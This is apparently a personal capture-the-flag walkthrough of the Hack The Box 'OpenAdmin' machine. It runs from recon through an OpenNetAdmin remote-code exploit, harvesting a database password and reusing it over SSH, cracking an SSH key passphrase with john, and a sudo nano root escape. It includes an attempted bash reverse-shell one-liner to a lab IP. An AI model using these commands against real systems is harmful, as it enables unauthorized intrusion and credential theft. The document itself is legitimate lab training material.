# recon
- 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

## gobuster
```
/artwork (Status: 301)
/index.html (Status: 200)
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
```

http://openadmin.htb/ona/
- OpenNetAdmin 18.1.1
- https://www.exploit-db.com/exploits/47691

# foothold as www-data
```console
kali@kali:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
./47691.sh: line 8: $'\r': command not found
./47691.sh: line 16: $'\r': command not found
./47691.sh: line 18: $'\r': command not found
./47691.sh: line 23: syntax error near unexpected token `done'
./47691.sh: line 23: `done'
```
to fix this run
```console
kali@kali:~/HTB/openadmin$ dos2unix 47691.sh 
dos2unix: converting file 47691.sh to Unix format...
kali@kali:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
$ id
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ pwd
/opt/ona/www
$ cd /home
$ pwd
/opt/ona/www
```
seem like we are trap... cannot `cd` anywhere...


anyhow, let `ls` and find more juicy info that might help us to next stage...
```console
$ ls /home 
jimmy
joanna
```
2 user and ofc we dont have premission to view `ls` thier direcotory. I used `ls` to gather more info but I can find any good. Now when I think about the open port, remember that port 22 is open! let find some keys
```
$ locate *.pub   
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_ecdsa_key.pub
/etc/ssh/ssh_host_ed25519_key.pub
/etc/ssh/ssh_host_rsa_key.pub
```
I viewed the key but it belong to root@openadmin which will not work... after google a bit, I saw a hint in HTB forum that I should look for `password`
```console
$ grep -r 'passwd' ./*
./include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
./include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
./include/functions_db.inc.php:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
./local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
```
we got a hit!! let view the file
```console
$ cat ./local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
# foothold as Jimmy
we got a credential `ona_sys:n1nj4W4rri0R!` so it is a mysqli credential?
```console
$ mysql -u ona_sys -p n1nj4W4rri0R!
$ which bash
/bin/bash
$ bash -i >& /dev/tcp/10.10.14.43/6969 0>&1
$ /bin/bash -i >& /dev/tcp/10.10.14.43/6969 0>&1
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```
nope didnt work here... anyway port 22 ssh is open, why not just try it out
```console
kali@kali:~/HTB/openadmin$ ssh ona_sys@openadmin.htb
The authenticity of host 'openadmin.htb (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'openadmin.htb,10.10.10.171' (ECDSA) to the list of known hosts.
ona_sys@openadmin.htb's password: 
Permission denied, please try again.
ona_sys@openadmin.htb's password: 

kali@kali:~/HTB/openadmin$ ssh joanna@openadmin.htb
joanna@openadmin.htb's password: 
Permission denied, please try again.
joanna@openadmin.htb's password: 

kali@kali:~/HTB/openadmin$ ssh jimmy@openadmin.htb
jimmy@openadmin.htb's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct 26 21:37:40 UTC 2020

  System load:  0.0               Processes:             120
  Usage of /:   49.3% of 7.81GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 
```
omg, we are in. Remember that some user re-use their password which is really normalt in real-life.


let recon
```console
jimmy@openadmin:~$ ls -la
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22  2019 .
drwxr-xr-x 4 root  root  4096 Nov 22  2019 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21  2019 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21  2019 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22  2019 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
jimmy@openadmin:~$ cd ../joanna # ofc
-bash: cd: ../joanna: Permission denied
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy: 
Sorry, try again.
[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on openadmin.
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

```console
jimmy@openadmin:~$ grep 'internal' /etc/group
internal:x:1002:jimmy,joanna
```

```console
jimmy@openadmin:~$ find / -group internal 2> /dev/null
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```
- index.php
```
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```
- main.php
```console
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
the interesting part is
```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
```
so it will cat the content of `joanna/.ssh/id_rsa` what we need to do is visit main.php. my guess is the web is runing on localhost. let list the open ports
```
jimmy@openadmin:/var/www/internal$ netstat -tulpn | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
so 3306 is mysql, 53 is dns. The interesting port is `52846`
```console
$ wget http://localhost:52846/
$ cat index.html
```
by view the content, I'm sure that the `internal` is running on this port! now let use `curl` to get `main.php`
```console
jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1902  100  1902    0     0   168k      0 --:--:-- --:--:-- --:--:--  185k
jimmy@openadmin:/var/www/internal$ cat test.txt 
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
.
.
.
```
now copy the key content and paste in kali

# foothold as Joanna
as you can see the key is encrypted which will ask us for a passphase if you will use the key. I try to `ssh` and using jimmy's password again since in one of the `.php` said something like `dont forget that we are ninja`. But it didnt works.. so let use `ssh2john` to passphase hash then use `john` to crack it
```console
root@kali:/home/kali/HTB/openadmin# find / -name ssh2john*
/usr/share/john/ssh2john.py
kali@kali:~/HTB/openadmin$ /usr/share/john/ssh2john.py joanna.pub > hash.txt
kali@kali:~/HTB/openadmin$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
bloodninjas      (joanna.pub)
```
WE GOT THE PASSWORD!!! let's ssh as Joanna
```
kali@kali:~/HTB/openadmin$ ssh joanna@openadmin.htb -i joanna.pub
load pubkey "joanna.pub": invalid format
Enter passphrase for key 'joanna.pub': 
joanna@openadmin:~$ cat user.txt
```

# root
```console
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
oh I know this trick, seem like to gain root is easier that what I expected. we will use `nano` to open `/opt/priv` and then spawn an interactive system shell, read more about it on [GTFObins/nano](https://gtfobins.github.io/gtfobins/nano/)
```console
joanna@openadmin:~$ sudo /bin/nano /opt/priv
^R^X
Command to execute: reset; sh 1>&0 2>&0#                                                                                       
#  Get Help                                                    ^X Read File
#  Cancel                                                      M-F New Buffer
# whoami
root
# cat /root/root.txt
```
GLHF and happy hacking!!